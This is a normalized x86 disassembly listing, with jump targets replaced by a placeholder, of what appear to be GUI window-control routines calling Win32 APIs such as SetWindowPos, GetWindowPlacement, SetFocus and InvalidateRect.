cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43eebc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_441928
push ebx
mov ebx eax
mov eax ebx
call sub_43d7ac
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43f15c
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c4d8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43cd98
sub_441964
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43a478
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4423cc
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43cd98
sub_4419a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4426d0
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4423cc
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4419e4
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43f15c
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4422d4
sub_441a24
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44250c
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_44250c
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_441a84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43c7f4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43b710
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43fcb8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_441af4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d8e4
mov edx esi
mov eax ebx
call sub_43f11c
pop esi
pop ebx
retn
sub_441b10
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_438b08
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_452980
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403420
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403420
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403420
test al al
jne r-xdata
sub_441ba4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_443518
mov edx esi
mov eax ebx
call sub_441b10
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43cd98
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43cd98
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43cd98
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_452980
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43cd98
test eax eax
jne r-xdata
jmp r-xdata
sub_441c88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43cd98
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_441cdc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43cd98
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_452980
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43cd98
test eax eax
jne r-xdata
sub_441d28
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_441b10
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43cd98
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_452980
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43cd98
test eax eax
jne r-xdata
sub_441d84
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_452980
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43cd98
mov [ esi + 0xc ] eax
sub_441db8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43b220
mov eax ebx
mov si 0xffd0
call sub_403420
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43b56c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441e90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43f0c0
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403420
inc edi
dec ebx
jne r-xdata
sub_441ed8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor eax eax
push ebp
push sub_441f76
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441e90
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441f7d
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_441f84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43ec8c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43f0c0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_442074
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413974
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413808
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413994
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413918
call sub_4423cc
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413918
call sub_4423cc
sub_44214c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_442074
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4421ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4423cc
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
test eax eax
jne r-xdata
sub_442210
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43cd98
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42bf68
call sub_42c048
test al al
je r-xdata
mov eax ebx
call sub_43f0fc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f0c0
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43f0c0
test [ eax + 0x52 ] 0x4
je r-xdata
sub_4422d4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43b56c
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44230c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_452980
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44234c
push ebx
mov ebx eax
mov eax ebx
call sub_452980
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_4566ec
pop ebx
retn
mov eax ebx
call sub_4529a8
mov eax ebx
call sub_4423cc
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_442384
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4423a8
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4423a8
sub_4423e0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_4124e4
mov eax edi
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43f0c0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_442474
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4423cc
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4424ac
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4426d0
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403420
sub_442568
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413974
pop esi
pop ebx
retn
sub_44258c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_442568
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413808
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413994
sub_442600
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4426d0
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43cd98
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_442660
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4426c4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426cb
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403420
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4055b0
sub_4426dc
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b220
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_442794
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413918
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4137bc
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403420
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4427f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4428ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403420
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428f1
mov eax [ ebp - 0x14 ]
call sub_403224
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413974
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413918
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403420
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_442900
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4427f4
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44292c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452980
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4427f4
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4427f4
mov edx eax
mov eax esi
call sub_4565ec
sub_442970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4429b8
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_442074
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43be3c
sub_442a00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_442a84
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4426d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43f0fc
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
